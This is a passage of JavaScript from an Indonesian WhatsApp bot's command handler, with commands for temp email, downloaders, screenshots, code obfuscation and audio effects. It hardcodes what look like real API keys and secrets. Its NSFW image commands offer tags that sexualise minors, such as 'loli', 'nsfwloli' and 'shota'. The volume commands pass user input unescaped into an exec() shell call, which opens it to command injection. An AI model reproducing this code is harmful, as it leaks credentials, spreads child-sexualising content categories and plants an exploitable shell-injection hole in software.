  console.error(er);
  m.reply("Tidak Ada Pesan Masuk");
}
}
break
case 'inboxmail': case 'inboxemail': case 'pesanemail': {
if (!text) return paycall(`Masukan Id Email Yang Sudah kalian buat'`)
try {
let data = await fetchJson(`https://dropmail.me/api/graphql/web-test-wgq6m5i?query=query%20(%24id%3A%20ID!)%20%7Bsession(id%3A%24id)%20%7B%20addresses%20%7Baddress%7D%2C%20mails%7BrawSize%2C%20fromAddr%2C%20toAddr%2C%20downloadUrl%2C%20text%2C%20headerSubject%7D%7D%20%7D&variables=%7B%22id%22%3A%22${text}%22%7D`)
let email = data["data"]["session"]["mails"][0]["toAddr"];
let teksnya = data["data"]["session"]["mails"][0]["text"];
let size = data["data"]["session"]["mails"][0]["rawSize"];
let type = data["data"]["session"]["mails"][0]["headerSubject"];
let linkinfo = data["data"]["session"]["mails"][0]["fromAddr"];
let urlnya = data["data"]["session"]["mails"][0]["downloadUrl"];
await m.reply(`📄Email: ${email}\n📝Text: ${teksnya}\n📊Size: ${size}\n📈Type: ${type}\n📌Link Info: ${linkinfo}\n🔗Url: ${urlnya}`)
} catch (er) {
  console.error(er);
  m.reply("TIDAK ADA PESAN YANG MASUK");
}
}
break
//=========================================================//
case 'wikipedia': {
if (!text) return paycall('put query')
wikipedia(`${text}`).then(res => {
    conn.sendFile2(m.chat, res.result.thumb, 'wiki.png',`*Judul:* ${res.result.judul}\n\n*Penjelasan:*\n${res.result.isi}\n\n*© Wikipedia*`, m)
  }).catch(() => { m.reply('Tidak Ditemukan') })
}
break
//==========================ENC SCRIPT===============================//
case 'enc': case 'encsc': {
if (!q) return paycall(`Example ${prefix+command} const ShinChan = require('NERO')`)
let meg = await obfus(q)
m.reply(`${meg.result}`)
}
break
case 'enc2': case 'encsc2': {
if (!text) throw `[!] Example ${prefix+command} const ShinChan = require('NERO')`
try {
let resenc = jsobfus.obfuscate(text)
m.reply(resenc.getObfuscatedCode())
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
}
break
//=========================================================//
case 'searchmusik': {
if (/document/.test(mime)) return paycall(`Kirim/Reply Video/Audio Kamu yang mau di cari judul lagunya dengan Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Kirim/Reply Video/Audio Kamu yang mau di cari judul lagunya dengan Caption ${prefix + command}`)
if (!quoted) return paycall(`Kirim/Reply Video/Audio Kamu yang mau di cari judul lagunya dengan Caption ${prefix + command}`)
try {
let metadate = `Metadata musik tidak ditemukan.`
let acrcloud = require('acrcloud')
m.reply(`Tunggu Lagi Mencari Judul Musik...`)
let acr = new acrcloud({
host: 'identify-eu-west-1.acrcloud.com',
access_key: '032babf75e1b0015c1295c1c720bda19',
access_secret: 'tjjcbm4CCaLcfc5Hmz7D9MgTELyYpe6UDdcX89dC'
})

if (/audio|video/.test(mime)) {
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
let ext = mime.split('/')[1]
fs.writeFileSync(`./src/${m.sender}.${ext}`, media)
let res = await acr.identify(fs.readFileSync(`./src/${m.sender}.${ext}`))
/*let { code, msg } = res.status
if (code !== 0) throw msg
let { title, artists, album, genres, release_date } = res.metadata.music[0]*/
let { code, msg } = res.status;
if (code !== 0) throw msg;
// Check if the music array exists and is not empty
if (!res.metadata || !res.metadata.music || res.metadata.music.length === 0) {
  throw metadate
}
// Access the first element of the music array
let { title, artists, album, genres, release_date } = res.metadata.music[0];
let txt = `
🎶𝙅𝙐𝘿𝙐𝙇 𝙈𝙐𝙎𝙄𝙆 𝘿𝙄𝙏𝙀𝙈𝙐𝙆𝘼𝙉🎶
=============================
• 📌 *TITLE*: ${title}
• 👨‍🎤 𝙰𝚁𝚃𝙸𝚂𝚃: ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'NOT FOUND'}
• 💾 𝙰𝙻𝙱𝚄𝙼: ${album.name || 'NOT FOUND'}
• 🌐 𝙶𝙴𝙽𝙴𝚁: ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'NOT FOUND'}
• 📆 RELEASE DATE: ${release_date || 'NOT FOUND'}
=============================
`.trim()
fs.unlinkSync(`./src/${m.sender}.${ext}`)
conn.sendMessage(m.chat, { caption: txt, document: audio, mimetype: 'audio/mpeg', fileName: `${title}.mp3`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/0e2b5f224fdcaf4b61d02.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})}
                        } catch (error) {
        console.error(error);
        replyerror('Metadata musik tidak ditemukan🥺🙏');
    }
                    }
break
case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
case 'kalkulator': {
  let id = m.chat
  conn.math = conn.math ? conn.math : {}
  if (id in conn.math) {
    clearTimeout(conn.math[id][3])
    delete conn.math[id]
    m.reply('Hmmm...ngecheat?')
  }
  let val = text
    .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
    .replace(/×/g, '*')
    .replace(/÷/g, '/')
    .replace(/π|pi/gi, 'Math.PI')
    .replace(/e/gi, 'Math.E')
    .replace(/\/+/g, '/')
    .replace(/\++/g, '+')
    .replace(/-+/g, '-')
  let format = val
    .replace(/Math\.PI/g, 'π')
    .replace(/Math\.E/g, 'e')
    .replace(/\//g, '÷')
    .replace(/\*×/g, '×')
  try {
    console.log(val)
    let result = (new Function('return ' + val))()
    if (!result) throw result
    m.reply(`${format} = ${result}`)
  } catch (e) {
    if (e == undefined) throw 'Isinya?'
    throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
}
break
case 'sinonim': case 'persamaankata': {
    query = `input text\nEx. .${prefix} hello world\n<command> <tex>`
    text
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else throw query

    try {
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        let res = await Persamaan_Kata(text)
        await conn.sendMessage(m.chat, { image: { url: res.image }, caption: "*[ Result ]*\n\n" + ArrClean(res.result) }, { quoted: m })
    } catch (e) {
        throw eror
    }
}
break
case 'fb': case 'fbdl': {
      if (!args[0]) throw `Input URL`;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let resfbdl = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=GataDios&url=${args[0]}`)
let hasildlnya = resfbdl.result[0]
await conn.sendMessage(m.chat, { video: { url: hasildlnya }, caption: done }, { quoted: m})
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
}
break
case 'twtdl': case 'twt': case 'twitter': {
      if (!args[0]) throw `Input URL`;
try {
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            let res = await fetchJson(`https://api.caliph.biz.id/api/twitter?url=${args[0]}&apikey=caliphkey`);
            if (res.result?.length) {
            for (let x = 0; x < res.result?.length; x++) {
     await conn.sendMessage(m.chat, { video: { url: res.result[x].url }, caption: done }, { quoted: m})
            }
       } else {
       await m.reply(`Size Terlalu Besar🙂`)
       }
} catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
}
break
case 'twtimg': {
      if (!args[0]) throw `Input URL`;
      try {
      await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
            let res = await fetchJson(`https://api.caliph.biz.id/api/twitter?url=${args[0]}&apikey=caliphkey`);
            for (let x = 0; x < res.result?.length; x++) {
      conn.sendMessage(m.chat, { image: { url: res.result[x].url }, caption: done }, { quoted: m})
            }
      } catch (error) {
        console.error(error);
        replyerror(`ERROR`);
    }
            }
break
case 'yandere': {
let { lookup } = require('mime-types')
  text = text.endsWith('SMH') ? text.replace('SMH', '') : text;
  if (!text) throw 'Input Query / yande.re Url';
  
  let [query, page] = text.split(' ');
  let res = await getYandeImage(query, page);

  if (res === 'in_progress') {
    await conn.sendMessage(m.chat, 'Fetching image. Please wait...', 'conversation', { quoted: m });
    return;
  }

  let mime = await lookup(res);
  text.match(URL_REGEX)
    ? await conn.sendMessage(
        m.chat,
        { [mime.split('/')[0]]: { url: res }, caption: `Success Download: ${await shortUrl(res)}` },
        { quoted: m }
      )
    : await conn.sendMessage(m.chat, { image: { url: res }, caption: `Result From: ${text}` }, { quoted: m });
};
break
case 'paizuri': {
    let urlnyacyy = 'https://api.waifu.im/search?included_tags=paizuri';
    try {
        const respai = await fetch(urlnyacyy);
        const datpay = await respai.json();

        if (datpay.images && datpay.images.length > 0) {
            const imageInfo = datpay.images[0];
            const caption = `
Signature: ${imageInfo.signature}
Extension: ${imageInfo.extension}
Image ID: ${imageInfo.image_id}
Favorites: ${imageInfo.favorites}
Source: ${imageInfo.source}
Width: ${imageInfo.width}
Height: ${imageInfo.height}
Byte Size: ${imageInfo.byte_size}
URL: ${imageInfo.url}
            `;
            const imageUrl = imageInfo.url;

           await conn.sendFile2(m.chat, imageUrl, null, caption, m);
        } else {
            m.reply('No anime images found.');
        }
    } catch (error) {
        console.error(error);
        m.reply('An error occurred while fetching the data.');
    }
}
break
case 'hen': {
    let anuhen = 'https://api.waifu.im/search/?is_nsfw=true';
    try {
        const resanuhen = await fetch(anuhen);
        const datanuhen = await resanuhen.json();

        if (datanuhen.images && datanuhen.images.length > 0) {
            const imageInfo = datanuhen.images[0];
            const caption = `
Signature: ${imageInfo.signature}
Extension: ${imageInfo.extension}
Image ID: ${imageInfo.image_id}
Favorites: ${imageInfo.favorites}
Source: ${imageInfo.source}
Width: ${imageInfo.width}
Height: ${imageInfo.height}
Byte Size: ${imageInfo.byte_size}
URL: ${imageInfo.url}
            `;
            const imageUrl = imageInfo.url;

           await conn.sendFile2(m.chat, imageUrl, null, caption, m);
        } else {
            m.reply('No anime images found.');
        }
    } catch (error) {
        console.error(error);
        m.reply('An error occurred while fetching the data.');
    }
}
break
case 'fantox': {
let arrlist = [
        "animal",
        "animalears",
        "anusview",
        "ass",
        "barefoot",
        "bed",
        "bell",
        "bikini",
        "blonde",
        "bondage",
        "bra",
        "breasthold",
        "breasts",
        "bunnyears",
        "bunnygirl",
        "chain",
        "closeview",
        "cloudsview",
        "cum",
        "dress",
        "drunk",
        "elbowgloves",
        "erectnipples",
        "fateseries",
        "fingering",
        "flatchest",
        "food",
        "foxgirl",
        "gamecg",
        "genshin",
        "glasses",
        "gloves",
        "greenhair",
        "hatsunemiku",
        "hcatgirl",
        "headband",
        "headdress",
        "headphones",
        "hentaimiku",
        "hentaivideo",
        "hloli",
        "hneko",
        "hololove",
        "horns",
        "inshorts",
        "japanesecloths",
        "necklace",
        "nipples",
        "nobra",
        "nsfwbeach",
        "nsfwbell",
        "nsfwdemon",
        "nsfwidol",
        "nsfwmaid",
        "nsfwmenu",
        "nsfwvampire",
        "nude",
        "openshirt",
        "pantyhose",
        "pantypull",
        "penis",
        "pinkhair",
        "ponytail",
        "pussy",
        "ribbons",
        "schoolswimsuit",
        "schooluniform",
        "seethrough",
        "sex",
        "sex2",
        "sex3",
        "shirt",
        "shirtlift",
        "skirt",
        "spreadlegs",
        "spreadpussy",
        "squirt",
        "stockings",
        "sunglasses",
        "swimsuit",
        "tail",
        "tattoo",
        "tears",
        "thighhighs",
        "thogirls",
        "topless",
        "torncloths",
        "touhou",
        "twintails",
        "uncensored",
        "underwear",
        "vocaloid",
        "weapon",
        "wet",
        "white",
        "whitehair",
        "wings",
        "withflowers",
        "withgun",
        "withpetals",
        "withtie",
        "withtree",
        "wolfgirl",
        "yuri"
    ]
    let listnya = arrlist.map((v, index) => {
        return `[ ${++index} ] ${prefix + command} ${v}`
    }).join("\n")
    let nah = `𝗟 𝗜 𝗦 𝗧
_Contoh: ${prefix + command} yuri_

${listnya}`
    if (!arrlist.includes(text)) return m.reply(nah)
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    try {
        let ani = await fetch("https://fantox-apis.vercel.app/" + text)
        let mek = await ani.json()
       // await conn.sendFile2(m.chat, mek.url, "", `${done}`, m)
       await conn.sendImage(m.chat, mek.url, done, m)
    } catch (error) {
    console.error(error);
        await m.reply(`Error Dari Servernya Bwang`);
    }
}
break
case 'ss': case 'sshp': case 'ssweb': case 'sstablet': case 'sspc': case 'sslaptop': {
    if (!text) return m.reply(`Gunakan format ${prefix + command} <url>\n\n*Contoh :* ${prefix + command} https://www.google.com\nList:\n${prefix}ss <url> (screenshot via hp)\n${prefix}sshp <url> (screenshot via hp)\n${prefix}ssweb <url> (screenshot via tablet)\n${prefix}sstablet <url> (screenshot via tablet)\n${prefix}sspc <url> (screenshot via pc)\n${prefix}sslaptop <url> (screenshot via laptop)`);
  
    //m.reply("_Loading. . ._");
    await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    
    const phone = await ssweb(text, 'phone');
    const desktop = await ssweb(text, 'desktop');
    const tablet = await ssweb(text, 'tablet');
    
    if (command === 'sshp' || command === 'ss') {
        await conn.sendFile2(m.chat, phone.result, '', done, m, false);
    }
    
    if (command === 'ssweb' || command === 'sstablet') {
        await conn.sendFile2(m.chat, tablet.result, '', done, m, false);
    }
    
    if (command === 'sspc' || command === 'sslaptop') {
        await conn.sendFile2(m.chat, desktop.result, '', done, m, false);
    }
};
break
case 'googlemaps': case 'gmaps': {
    let [dari, ke] = text.split('|');
    if (!dari || !ke) throw `Ex: ${prefix + command} pekalongan|sukabumi`;
    
    if (dari.toLowerCase() === ke.toLowerCase()) {
        m.reply("hey bung, kau dari kota mana bodoh ?!\nAWOKAWOAKOAK");
        return;
    }

    m.reply("Tunggu sebentar yah, sedang diminta peta nya...");

    let result = await jarak(dari, ke);

    if (result.img) {
        let imgBuffer = Buffer.from(result.img, 'base64');
        let resizedImgBuffer = await sharp(imgBuffer).toBuffer();

        conn.sendMessage(m.chat, { image: resizedImgBuffer, caption: result.captions.join('\n') + `\n\nhttps://www.google.com/maps/dir/${encodeURIComponent(dari)}/${encodeURIComponent(ke)}/` }, { quoted: m });
    } else {
        m.reply(result.captions.join('\n') + `\n\nhttps://www.google.com/maps/dir/${encodeURIComponent(dari)}/${encodeURIComponent(ke)}/`);
    }
};
break
case 'lookup': {
  if (!text) throw `Masukkan Domain/Sub Domain!\n\n*Contoh:* botcahx.live`;

  if (text.includes('https://') || text.includes('http://')) throw `Tolong masukkan domain/sub domain secara lengkap. Contoh: botcahx.live`;

  try {
    // fetch pertama
    const api_key = 'E4/gdcfciJHSQdy4+9+Ryw==JHciNFemGqOVIbyv';
    const res1 = await fetch(`https://api.api-ninjas.com/v1/dnslookup?domain=${text}`, {
      headers: { 'X-Api-Key': api_key },
      contentType: 'application/json'
    })
    .then(response => response.text())
    .catch(error => {
      console.log(error);
      return fetch(`https://api.hackertarget.com/dnslookup/?q=${text}`)
      .then(response => response.text())
      .then(data => {
        m.reply(`*Ini Adalah Hasil Dns Lookup Untuk ${text}:*\n${data}`);
        console.log(data);
      })
      .catch(error => {
        console.error(error);
        m.reply('*Tidak dapat memproses permintaan DNS Lookup*');
      });
    });
    m.reply(`*Ini Adalah Hasil Dns Lookup Untuk ${text}:*\n${res1}`);
    console.log(res1);

  } catch (error) {
    console.log(error);
    m.reply('*Invalid data!*');
  }
};
break
case 'git': case 'gitclone': {
if (!args[0]) return paytod(`Mana Link Github nya?\nExample :\n${prefix}${command} https://github.com/xxx/xxxx`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return paytod(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(mess.error))
    }
break
case 'mega': {
const { File } = require("megajs")
    try {
        if (!text) return m.reply(`Contoh:\n${prefix + command} https://mega.nz/file/0FUA2bzb#vSu3Ud9Ft_HDz6zPvfIg_y62vE1qF8EmoYT3kY16zxo`);
        const file = File.fromURL(text);
        await file.loadAttributes();
     //   if (file.size >= 300000000) return m.reply('Error: ukuran file terlalu besar (Ukuran Max: 300MB)');
        m.reply(`*_Mohon tunggu beberapa menit..._*\n${file.name} sedang diunduh...`);
        const data = await file.downloadBuffer();
        // Menambahkan ekstensi yang didukung (zip, rar, 7z, jpg, png) ke dalam daftar
        if (/mp4/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "video/mp4",
                filename: `${file.name}.mp4`
            }, {
                quoted: m
            });
        } else if (/pdf/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "application/pdf",
                filename: `${file.name}.pdf`
            }, {
                quoted: m
            });
        } else if (/apk/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "application/vnd.android.package-archive",
                filename: `${file.name}`
            }, {
                quoted: m
            });
            } else if (/zip/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "application/zip",
                filename: `${file.name}.zip`
            }, {
                quoted: m
            });
        } else if (/rar/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "application/x-rar-compressed",
                filename: `${file.name}.rar`
            }, {
                quoted: m
            });
        } else if (/7z/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "application/x-7z-compressed",
                filename: `${file.name}.7z`
            }, {
                quoted: m
            });
        } else if (/jpg|jpeg/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "image/jpeg",
                filename: `${file.name}.jpg`
            }, {
                quoted: m
            });
        } else if (/png/.test(file.name)) {
            await conn.sendMessage(m.chat, {
                document: data,
                mimetype: "image/png",
                filename: `${file.name}.png`
            }, {
                quoted: m
            });
        } else {
            return m.reply('Error: Format file tidak didukung');
        }
    } catch (error) {
        return m.reply(`Error: ${error.message}`);
    }
}
break

case 'zcodequest': case 'zcodegen': case 'zcodebug': case 'zcoderef': case 'zcoderev': case 'zcodedoc': {
    if (!(m.quoted && m.quoted.text && text)) return m.reply("*Example:*\n" + prefix + command + " js (with reply code)")
    const model = text.trim();
    const question = m.quoted.text;

    if (command === "zcodequest") {
        try {
            const payload = {
                p1: model,
                p2: question,
                option1: "3 - A detailed answer",
                option2: "Professional",
                option3: "Indonesian"
            };
            const msg = await fetchAndParse(payload, 'answer-question')
            await m.reply(msg)
        } catch (e) {
            return m.reply(eror)
        }
    }

    if (command === "zcodegen") {
        try {
            const payload = {
                p1: model,
                p2: question,
                option1: "3 - A detailed answer",
                option2: "Professional",
                option3: "Indonesian"
            };
            const msg = await fetchAndParse(payload, 'code-generator')
            await m.reply(msg)
        } catch (e) {
            return m.reply(eror)
        }
    }

    if (command === "zcodebug") {
        try {
            const payload = {
                p1: model,
                p2: null,
                p3: question,
                option1: "find and explain bug",
                option2: "Professional",
                option3: "Indonesian"
            };
            const msg = await fetchAndParse(payload, 'code-debug')
            await m.reply(msg)
        } catch (e) {
            return m.reply(eror)
        }
    }

    if (command === "zcoderef") {
        try {
            const payload = {
                p1: model,
                p2: null,
                p3: question,
                option1: "Refactor my code and explain me",
                option2: "Professional",
                option3: "Indonesian"
            };
            const msg = await fetchAndParse(payload, 'code-refactor')
            await m.reply(msg)
        } catch (e) {
            return m.reply(eror)
        }
    }

    if (command === "zcoderev") {
        try {
            const payload = {
                p1: model,
                p2: null,
                p3: question,
                option1: "Make a full code review",
                option2: "Professional",
                option3: "Indonesian"
            };
            const msg = await fetchAndParse(payload, 'code-review')
            await m.reply(msg)
        } catch (e) {
            return m.reply(eror)
        }
    }

    if (command === "zcodedoc") {
        try {
            const payload = {
                p1: model,
                p2: null,
                p3: question,
                option1: "Add comment everwhere you can",
                option2: "Professional",
                option3: "Indonesian"
            };
            const msg = await fetchAndParse(payload, 'code-documentation')
            await m.reply(msg)
        } catch (e) {
            return m.reply(eror)
        }
    }

}
break
case 'seaart': {
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else return m.reply("Masukkan pesan!")
    await m.reply(wait)
    const requestData = {
        page: 1,
        page_size: pagePre,
        order_by: 'new',
        type: 'community',
        keyword: text,
        tags: []
    };
    try {
        const result = await fetchData(requestData);
        await conn.sendMessage(m.chat, {
            image: {
                url: result.banner.url
            },
            caption: `Prompt: ${result.prompt}\nModel id: ${result.model_id}\nAuthor: ${result.author.name}`,
            mentions: [m.sender]
        }, {
            quoted: m
        });
    } catch (error) {
        console.error('Error in example usage:', error);
        await m.reply(`Error Bang`);
    }
}
break
case 'foto': {
    var arrlist = [
        "aesthetic",
        "ahegao",
        "akira",
        "akiyama",
        "ana",
        "anjing",
        "ass",
        "asuna",
        "ayuzawa",
        "bdsm",
        "blackpink",
        "blowjob",
        "boneka",
        "boruto",
        "cecan",
        "cecan2",
        "cecan3",
        "cecan4",
        "cecan5",
        "chiho",
        "china",
        "chitoge",
        "cogan",
        "cogan2",
        "cosplay",
        "cosplayloli",
        "cosplaysagiri",
        "cuckold",
        "cum",
        "cyberspace",
        "deidara",
        "doraemon",
        "eba",
        "elaina",
        "emilia",
        "ero",
        "erza",
        "femdom",
        "foot",
        "gangbang",
        "gifs",
        "glasses",
        "gremory",
        "hekel",
        "hentai",
        "hestia",
        "hinata",
        "inori",
        "Islamic",
        "isuzu",
        "itachi",
        "itori",
        "jahy",
        "jeni",
        "jiso",
        "justina",
        "kaga",
        "kagura",
        "kakasih",
        "kaori",
        "kartun",
        "katakata",
        "keneki",
        "kotori",
        "kpop",
        "kucing",
        "kurumi",
        "lisa",
        "loli",
        "madara",
        "manga",
        "masturbation",
        "megumin",
        "mikasa",
        "miku",
        "minato",
        "mobil",
        "montor",
        "mountain",
        "naruto",
        "neko",
        "neko2",
        "nekonime",
        "nezuko",
        "nsfwloli",
        "onepiece",
        "orgy",
        "panties",
        "pentol",
        "pokemon",
        "ppcouple",
        "programing",
        "profilwa",
        "pubg",
        "pussy",
        "rize",
        "rose",
        "ryujin",
        "sagiri",
        "sakura",
        "sasuke",
        "satanic",
        "shina",
        "shinka",
        "shinomiya",
        "shizuka",
        "shota",
        "tatasurya",
        "tejina",
        "technology",
        "tentacles",
        "thighs",
        "toukachan",
        "tsunade",
        "waifu",
        "waifu2",
        "wallhp",
        "yotsuba",
        "yuki",
        "yulibocil",
        "yumeko",
        "yuri",
        "zettai"
    ]
    var listnya = arrlist.map((v, index) => `[ ${++index} ] ${prefix + command} ${v}`).join('\n')
    let nah = `*L I S T*
_Example: ${prefix + command} yulibocil_

${listnya}`
    if (!arrlist.includes(text)) throw nah
try {
    let ani = await fetchJson('https://raw.githubusercontent.com/AyGemuy/RESTAPI/master/data/' + text + '.json')
    let result = ani[Math.floor(Math.random() * ani.length)]
    await conn.sendFile2(m.chat, result, "", done, m) // Mengirim file dengan argumen yang sesuai
} catch (error) {
    console.error('Error in example usage:', error);
    await m.reply(`Error Bang`);
}
}
break

case 'doods': {
const msg = `Input link atau reply link!\n\n*Contoh:*\n${prefix + command} link`;
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else return m.reply(msg)

    const inputText = text.trim();

    if (!inputText) return m.reply(msg)
    const match = inputText.match(regexPattern);
    if (!match) return m.reply("Input tidak sesuai dengan regex pattern.");

    try {
        const playUrl = await generatePlayUrl(inputText);
        return m.reply("- *Stream:*\n" + playUrl);
    } catch (error) {
        console.error(error);
        return m.reply('Terjadi kesalahan saat mengunduh video. Silakan coba lagi nanti.');
    }
};
break
case 'qc': {
                const {
                    quote
                } = require('./lib/quote.js')
const msg = `Kirim Teks atau reply Teks!`;
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else return m.reply(msg)
                let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/ce3fd83d90be494079357.jpg')
                try {
                const rest = await quote(text, pushname, ppnyauser)
                conn.sendImageAsSticker(m.chat, rest.result, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
                } catch (error) {
        console.error(error);
        return m.reply('Error Huwaa.');
    }
            }
            break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else paytod(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replyerror(e)
                }
                break
case 'volaudio': {
if (!args.join(" ")) return paytod(`Example: ${prefix + command} 10`)
media = await conn.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return paytod('Error!')
jadie = fs.readFileSync(rname)
conn.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return paytod(`Example: ${prefix + command} 10`)
media = await conn.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return paytod('Error!')
jadie = fs.readFileSync(rname)
conn.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  //(error41)
  
//GAME
//=================================================
/*case 'family100': {
 if ('family100'+from in _family100) {
 m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await conn.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await conn.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 conn.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(30000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
